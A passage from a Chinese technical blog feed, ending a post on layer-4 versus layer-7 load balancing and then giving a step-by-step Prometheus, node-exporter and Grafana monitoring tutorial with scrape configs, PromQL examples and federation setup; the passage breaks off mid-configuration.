服务、高级流量管理和内容路由</td></tr><tr><td><strong>性能</strong></td><td>性能更高，因为只处理较为简单的 IP 和端口信息</td><td>性能相对较低，因为需要解析应用数据</td></tr><tr><td><strong>处理层次</strong></td><td>不关心应用内容，关注的是数据包的传输层信息</td><td>关心应用内容，能够分析和处理协议的具体数据</td></tr></tbody></table><h2 id="4-实际应用中的选择"><a href="#4-实际应用中的选择" class="headerlink" title="4. 实际应用中的选择"></a>4. <strong>实际应用中的选择</strong></h2><ul><li><strong>四层负载均衡器</strong>（如 <strong>F5、Nginx 四层模式</strong>）：通常用于 <strong>TCP&#x2F;IP 流量</strong>，如数据库服务器、邮件服务器等，只需要基于 IP 和端口做转发。它们较为简单、高效，适合处理大量的并发连接。</li><li><strong>七层负载均衡器</strong>（如 <strong>Nginx 七层模式、HAProxy</strong>）：用于 <strong>Web 应用服务</strong>，可以根据请求的具体内容（如 HTTP 请求路径、头部信息、Cookie、查询参数等）进行更细粒度的路由决策。它们通常在处理 Web 流量、API 请求时更加灵活和智能，适用于需要应用级流量管理的场景。</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>prometheus+Grafana+k8s全方位教学</title>
    <link href="/2025/04/16/prometheus-Grafana-k8s%E5%85%A8%E6%96%B9%E4%BD%8D%E6%95%99%E5%AD%A6/"/>
    <url>/2025/04/16/prometheus-Grafana-k8s%E5%85%A8%E6%96%B9%E4%BD%8D%E6%95%99%E5%AD%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="1、架构图"><a href="#1、架构图" class="headerlink" title="1、架构图"></a>1、架构图</h2><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/39b97ead427144628582592e0c502bcd.png" alt="在这里插入图片描述"></p><h2 id="2、组件"><a href="#2、组件" class="headerlink" title="2、组件"></a>2、组件</h2><p><strong>Prometheus Server</strong><br>用于收集和存储时间序列数据。Prometheus Server 是 Prometheus 组件中的核心部分，负责实现对监控数据的获取，存储以及查询。 Prometheus Server 可以通过静态配置管理监控目标，也可以配合使用 Service Discovery 的方式动态管理监控目标，并从这些监控目标中获取数据。其次 Prometheus Server 需要对采集到的监控数据进行存储，Prometheus Server 本身就是一个时序数据库，将采集到的监控数据按照时间序列的方式存储在本地磁盘当中。最后Prometheus Server 对外提供了自定义的 PromQL 语言，实现对数据的查询以及分析。</p><p><strong>Exporter</strong><br>用于暴露已有的第三方服务的 metrics 给 Prometheus。Exporter 将监控数据采集的端点通过 HTTP 服务的形式暴露给 Prometheus Server，Prometheus Server 通过访问该 Exporter 提供的 Endpoint 端点，即可获取到需要采集的监控数据。</p><p><strong>Push Gateway</strong><br>主要用于短期的 jobs。由于这类 jobs 存在时间较短，可能在 Prometheus 来 pull 之前就消失了。为此，这些 jobs 可以直接向 Prometheus server 端推送它们的 metrics。</p><p><strong>Grafana</strong><br>第三方展示工具，可以编写 PromQL 查询语句，通过 http 协议与 prometheus 集成。</p><p><strong>AlertManager</strong><br>从 Prometheus Server 端接收到 alerts 后，会进行去除重复数据，分组，并路由到对方的接受方式，发出报警。常见的接收方式有：电子邮件，钉钉、企业微信，pagerduty等。</p><p><strong>Client Library</strong><br>客户端库，为需要监控的服务生成相应的 metrics 并暴露给 Prometheus Server。当 Prometheus Server 来 pull 时，直接返回实时状态的 metrics。</p><pre><code class="hljs">  监控流程：      1.exporter节点暴露监控指标;      2.Prometheus server修改配置文件监控暴露节点;      3.重载配置检查WebUI;      4.grafana出图展示;</code></pre><h2 id="3、prometheus部署"><a href="#3、prometheus部署" class="headerlink" title="3、prometheus部署"></a>3、prometheus部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载Prometheus的软件包<br>[root@prometheus-server31 ~]# wget https://github.com/prometheus/prometheus/releases/download/v2.53.2/prometheus-2.53.2.linux-amd64.tar.gz<br><br>上传普罗米修斯部署脚本（需要脚本可后台留言~）<br>[root@prometheus-server31 ~]# tar xf install-prometheus-server.tar.gz <br><br>安装<br>[root@prometheus-server31 ~]# ./install-prometheus-server.sh i<br></code></pre></td></tr></table></figure><h2 id="4、node-exporter环境搭建"><a href="#4、node-exporter环境搭建" class="headerlink" title="4、node-exporter环境搭建"></a>4、node-exporter环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">下载软件包 <br>[root@prometheus-node41 ~]# wget https://github.com/prometheus/node_exporter/releases/download/v1.8.2/node_exporter-1.8.2.linux-amd64.tar.gz<br><br>脚本一键部署node-exporter（需要脚本后台留言~）<br>[root@prometheus-node41 ~]# tar xf install-node-exporter.tar.gz <br><br>安装服务 <br>[root@prometheus-node41 ~]# ./install-node-exporter.sh i<br></code></pre></td></tr></table></figure><h2 id="5、Prometheus-server监控node-exporter实战"><a href="#5、Prometheus-server监控node-exporter实战" class="headerlink" title="5、Prometheus server监控node-exporter实战"></a>5、Prometheus server监控node-exporter实战</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.修改Prometheus server的配置文件监控node-exporter节点 <br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br><span class="hljs-comment"># 修改通用全局配置</span><br>global:<br>  <span class="hljs-comment"># Prometheus server抓取数据的间隔时间，默认值为1分钟</span><br>  scrape_interval: 3s <br>  <br>...<br><span class="hljs-comment"># 定义抓取配置</span><br>scrape_configs:<br>  ...(添加如下信息)<br><br>    <span class="hljs-comment"># 自定义任务的名称</span><br>  - job_name: node-exporters<br>    <span class="hljs-comment"># 指定采集指标时访问的路径</span><br>    metrics_path: /metrics<br>    <span class="hljs-comment"># 指定采集指标时使用的协议</span><br>    scheme: http<br>    <span class="hljs-comment"># 指定被监控的node-exporter节点列表</span><br>    static_configs:<br>    - targets:<br>      - 10.0.0.41:9100<br>      - 10.0.0.42:9100<br>      - 10.0.0.43:9100<br><br><br>2.检查配置文件语法是否正确 <br>[root@prometheus-server31 ~]# /softwares/prometheus-2.53.2.linux-amd64/promtool check config  /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>3.Prometheus server加载配置文件<br>[root@prometheus-server31 ~]# curl -X POST 10.0.0.31:9090/-/reload<br><br>4.给检查和加载配置文件起别名<br>[root@prometheus-server31 ~]# vim ~/.bashrc <br>...<br><span class="hljs-built_in">alias</span> rr=<span class="hljs-string">&#x27;curl -X POST 10.0.0.31:9090/-/reload&#x27;</span><br><span class="hljs-built_in">alias</span> check=<span class="hljs-string">&#x27;/softwares/prometheus-2.53.2.linux-amd64/promtool check config  /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml&#x27;</span><br><br>[root@prometheus-server31 ~]# <span class="hljs-built_in">source</span>  ~/.bashrc <br><br>5.查看Prometheus的WebUI验证节点是否加入成功<br>http://10.0.0.31:9090/targets<br><br>6..查看Prometheus的指标数据<br>node_cpu_seconds_total<br></code></pre></td></tr></table></figure><h2 id="6、PQL"><a href="#6、PQL" class="headerlink" title="6、PQL"></a>6、PQL</h2><p>prometheus监控中采集过来的数据统一称为Metrics数据，其并不是代表具体的数据格式，而是一种统计度量计算单位。</p><p>当我们需要为某个系统或者某个服务做监控时，就需要使用到metrics。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">前提条件: (所有节点时区同步)<br><span class="hljs-built_in">ln</span> -svf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime <br></code></pre></td></tr></table></figure><h4 id="体验promql"><a href="#体验promql" class="headerlink" title="体验promql"></a><strong>体验promql</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 查看某个特定的key<br>node_cpu_seconds_total<br><br>2 查看某个节点的指标<br>node_cpu_seconds_total&#123;instance=<span class="hljs-string">&quot;10.0.0.41:9100&quot;</span>&#125;<br><br>3 查看某个节点的某刻CPU的某种状态<br>node_cpu_seconds_total&#123;instance=<span class="hljs-string">&quot;10.0.0.41:9100&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>,mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;<br><br>4 查询最近10s内某个节点CPU的某种状态时间<br>node_cpu_seconds_total&#123;instance=<span class="hljs-string">&quot;10.0.0.41:9100&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>,mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;[10s]<br><br>5 统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，非空闲状态使用的总时间<br>node_cpu_seconds_total&#123;mode!=<span class="hljs-string">&quot;idle&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m]<br><br>6 统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，mode名称以字母<span class="hljs-string">&quot;i&quot;</span>开头的所有CPU核心。<br>node_cpu_seconds_total&#123;mode=~<span class="hljs-string">&quot;i.*&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m]<br><br>7 统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，mode名称不是以字母<span class="hljs-string">&quot;i&quot;</span>开头的所有CPU核心。<br>node_cpu_seconds_total&#123;mode!~<span class="hljs-string">&quot;i.*&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m]<br><br></code></pre></td></tr></table></figure><h4 id="Prometheus常用的函数"><a href="#Prometheus常用的函数" class="headerlink" title="Prometheus常用的函数"></a><strong>Prometheus常用的函数</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 increase函数: 用来针对counter数据类型，截取其中一段时间总的增量。<br>举个例子:<br>   increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m])<br>统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，空闲状态使用的总时间增量。<br><br>2 <span class="hljs-built_in">sum</span>函数: 加和的作用。<br>举个例子:<br> <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>&#125;[1m]))<br>统计1分钟内，使用标签过滤器查看所有节点的第0颗CPU，空闲状态使用的总时间增量，并将返回结果累加。<br><br>3 by函数: 将数据进行分组，类似于MySQL的<span class="hljs-string">&quot;GROUP BY&quot;</span>。<br>举个例子:<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;[1m])) by (instance)<br>统计1分钟内，使用标签过滤器查看CPU空闲状态，并将结果进行累加，基于instance进行分组。<br><br>4 rate函数: 它的功能是按照设置的时间段，取counter在这个时间段中平均每秒的增量。<br>举个例子:<br>rate(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>,cpu=<span class="hljs-string">&quot;0&quot;</span>, instance=<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>&#125;[1m])<br>统计1分钟内，使用标签过滤器查看<span class="hljs-string">&quot;10.0.0.42:9100&quot;</span>节点的第0颗CPU，空闲状态使用的每秒的增量。<br><br>increase和rate如何选择:<br>(1)对于采集数据频率较低的场景建议使用increase函数，因为使用rate函数可能会出现断点,比如针对硬盘容量监控。<br>(2)对于采集数据频率较高的场景建议使用rate函数，比如针对CPU，内存，网络流量等都是可以基于rate函数来采集等。<br><br>5 topk函数: 取前几位的最高值，实际使用的时候一般会用该函数进行瞬时报警，而不是为了观察曲线图。<br>举个例子:<br>topk(3, rate(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;[1m]))<br>统计1分钟内，使用标签过滤器查看CPU，所有状态使用的每秒的增量，只查看前3个节点。<br><br>6 count函数:<br>把数值符合条件的，输出数目进行累加加和。<br>比如说企业中有100台服务器，如果只有10台服务器CPU使用率高于80%时候是不需要报警的，但是数量操作70台时就需要报警了。<br><br>举个例子:<br>count(tcp_wait_conn &gt; 500):<br>假设(tcp_wait_conn是咱们自定义的KEY。<br>若TCP等待数量大于500的机器数量就判断条件为真。<br><br>count(rate(node_cpu_seconds_total&#123;cpu=<span class="hljs-string">&quot;0&quot;</span>,mode=<span class="hljs-string">&quot;idle&quot;</span>&#125;[1m]))<br>对统计的结果进行计数。<br><br>7 其他函数  https://prometheus.io/docs/prometheus/latest/querying/functions/<br></code></pre></td></tr></table></figure><h4 id="监控CPU的使用情况案例"><a href="#监控CPU的使用情况案例" class="headerlink" title="监控CPU的使用情况案例"></a>监控CPU的使用情况案例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 统计各个节点CPU的使用率<br>1.1 我们需要先找到CPU相关的KEY<br>node_cpu_seconds_total<br><br>1.2 过滤出CPU的空闲时间(&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;)和全部CPU的时间(<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>)<br>node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;<br>过滤CPU的空闲时间。<br><br>node_cpu_seconds_total&#123;&#125;<br>此处的<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span>可以不写，因为里面没有任何参数，代表获取CPU的所有状态时间。<br><br>1.3 统计1分钟内CPU的增量时间<br>increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m])<br>统计1分钟内CPU空闲状态的增量。<br><br>increase(node_cpu_seconds_total[1m])<br>统计1分钟内CPU所有状态的增量。<br><br>1.4 将结果进行加和统计<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m]))<br>将1分钟内所有CPU空闲时间的增量进行加和计算。<br><br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m]))<br>将1分钟内所有CPU空闲时间的增量进行加和计算。<br><br>1.5 按照不同节点进行分组<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m])) by (instance)<br>将1分钟内所有CPU空闲时间的增量进行加和计算，并按照机器实例进行分组。<br><br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)<br>将1分钟内所有CPU空闲时间的增量进行加和计算，并按照机器实例进行分组。<br><br>1.6 计算1分钟内CPU空闲时间的百分比<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)<br><br>1.7 统计1分钟内CPU的使用率，计算公式: (1 - CPU空闲时间的百分比) * 100%。<br>(1 - <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)) * 100<br><br>1.7 统计1小时内CPU的使用率，计算公式: (1 - CPU空闲时间的百分比) * 100%。<br>(1 - <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;idle&#x27;</span>&#125;[1h])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1h])) by (instance)) * 100<br><br><br>2 计算CPU用户态的1分钟内百分比<br><span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;user&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance) * 100<br><br>3 计算CPU内核态的1分钟内百分比<br>(<span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;system&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)) * 100<br><br>4 计算CPU IO等待时间的1分钟内百分比<br>(<span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total&#123;mode=<span class="hljs-string">&#x27;iowait&#x27;</span>&#125;[1m])) by (instance) / <span class="hljs-built_in">sum</span>(increase(node_cpu_seconds_total[1m])) by (instance)) * 100<br></code></pre></td></tr></table></figure><h2 id="7、grafana"><a href="#7、grafana" class="headerlink" title="7、grafana"></a>7、grafana</h2><h4 id="grafana部署"><a href="#grafana部署" class="headerlink" title="grafana部署"></a>grafana部署</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. 下载grafana<br>wget https://dl.grafana.com/enterprise/release/grafana-enterprise_11.1.4_amd64.deb<br><br>2.安装grafana<br>[root@prometheus-server31 ~]# apt-get install -y adduser libfontconfig1 musl<br>[root@prometheus-server31 ~]# <br>[root@prometheus-server31 ~]# dpkg -i grafana-enterprise_11.1.4_amd64.deb<br><br>3.启动grafana <br>[root@prometheus-server31 ~]# systemctl <span class="hljs-built_in">enable</span> --now grafana-server<br>[root@prometheus-server31 ~]# <br>[root@prometheus-server31 ~]# ss -ntl | grep 3000<br>LISTEN 0      4096               *:3000            *:*    <br><br>4.访问grafana的WebUI<br>http://10.0.0.31:3000/login<br>- 1.初始化的用户名和密码均为: admin <br></code></pre></td></tr></table></figure><p><strong>配置Prometheus的数据源</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/781412229a9249699bcf56555933b72f.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/89dcebbc6a794cdd9ce03c819b5ff35c.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/45133fff7e4146bf9b3b4a7e6b975270.png" alt="在这里插入图片描述"></p><p><strong>添加服务端地址</strong><br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/69aff8fdd139453da62a7f029ce5fdb1.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/96440f22bc744cf98ef6b9a796e7e8e6.png" alt="在这里插入图片描述"></p><p><strong>导入样板</strong><br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/849314b2241045a28049f184cabcafcd.png" alt="在这里插入图片描述"></p><p><strong>选择样板id</strong><br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/32037fdf1cc2467fa22574fc36677118.png" alt="在这里插入图片描述"></p><p><strong>选择数据源</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2218c681c0de4de39e80bc63a92c4ed0.png" alt="在这里插入图片描述"></p><p><strong>配置grafana展示node-exporter数据</strong><br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2aee5db9f02445a4b4bbebe06cad4744.png" alt="在这里插入图片描述"></p><h4 id="grafana自定义dashboard"><a href="#grafana自定义dashboard" class="headerlink" title="grafana自定义dashboard"></a>grafana自定义dashboard</h4><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/0af2d0c02ef44fbfab2c39a58387bd87.png" alt="在这里插入图片描述"></p><h4 id="grafana实现备份和恢复"><a href="#grafana实现备份和恢复" class="headerlink" title="grafana实现备份和恢复"></a>grafana实现备份和恢复</h4><p>保存json文件，恢复的时候可粘贴内容或者导入文件</p><h2 id="8、联邦模式"><a href="#8、联邦模式" class="headerlink" title="8、联邦模式"></a>8、联邦模式</h2><p>默认情况下，prometheus采集的数据会存储到本地，这意味者prometheus在这种工作模式下，可能会存在单机存储的瓶颈。</p><ul><li><p>为了解决prometheus对于数据的采集压力，我们可以采用联邦模式来部署prometheus</p></li><li><p>所谓联邦模式就是部署多个server共同采集数据</p></li></ul><h4 id="联邦架构图"><a href="#联邦架构图" class="headerlink" title="联邦架构图"></a><strong>联邦架构图</strong></h4><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/26cbfe2310e248c59a3e22826211db12.png" alt="在这里插入图片描述"></p><h4 id="部署联邦模式"><a href="#部署联邦模式" class="headerlink" title="部署联邦模式"></a><strong>部署联邦模式</strong></h4><p>1.修改prometheus server32配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改prometheus server配置文件<br>[root@prometheus-server32 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>scrape_configs:<br>  ...<br><br>  - job_name: <span class="hljs-string">&#x27;file-service-discovery-32&#x27;</span><br>    static_configs:<br>    - targets:<br>      - <span class="hljs-string">&quot;10.0.0.41:9100&quot;</span><br><br>重载prometheus server<br>[root@prometheus-server32 ~]# curl -X POST http://10.0.0.32:9090/-/reload<br><br>验证数据是否采集成功<br>http://10.0.0.32:9090/targets<br></code></pre></td></tr></table></figure><p>2.修改prometheus server33配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改prometheus server的配置文件<br>[root@prometheus-server33 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&#x27;file-service-discovery-33&#x27;</span><br>    static_configs:<br>    - targets:<br>      - <span class="hljs-string">&quot;10.0.0.42:9100&quot;</span><br>  - <span class="hljs-string">&quot;10.0.0.43:9100&quot;</span><br><br>重载prometheus server<br>[root@prometheus-server33 ~]# curl -X POST http://10.0.0.33:9090/-/reload<br><br>验证数据是否采集成功<br>http://10.0.0.33:9090/targets<br></code></pre></td></tr></table></figure><p>3.修改Prometheus server31配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改prometheus server的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;prometheus-federate-32&quot;</span><br>    metrics_path: <span class="hljs-string">&quot;/federate&quot;</span><br>    <span class="hljs-comment"># 用于解决标签的冲突问题，有效值为: true和false，默认值为false</span><br>    <span class="hljs-comment"># 当设置为true时，将保留抓取的标签以忽略服务器自身的标签。说白了会覆盖原有标签。</span><br>    <span class="hljs-comment"># 当设置为false时，则不会覆盖原有标签，而是在标点前加了一个&quot;exported_&quot;前缀。</span><br>    honor_labels: <span class="hljs-literal">true</span><br>    params:<br>       <span class="hljs-string">&quot;match[]&quot;</span>:<br>       - <span class="hljs-string">&#x27;&#123;job=&quot;promethues&quot;&#125;&#x27;</span><br>       - <span class="hljs-string">&#x27;&#123;__name__=~&quot;job:.*&quot;&#125;&#x27;</span><br>       - <span class="hljs-string">&#x27;&#123;__name__=~&quot;node.*&quot;&#125;&#x27;</span><br>    static_configs:<br>    - targets:<br>        - <span class="hljs-string">&quot;10.0.0.32:9090&quot;</span><br><br>  - job_name: <span class="hljs-string">&quot;prometheus-federate-33&quot;</span><br>    metrics_path: <span class="hljs-string">&quot;/federate&quot;</span><br>    honor_labels: <span class="hljs-literal">true</span><br>    params:<br>       <span class="hljs-string">&quot;match[]&quot;</span>:<br>       - <span 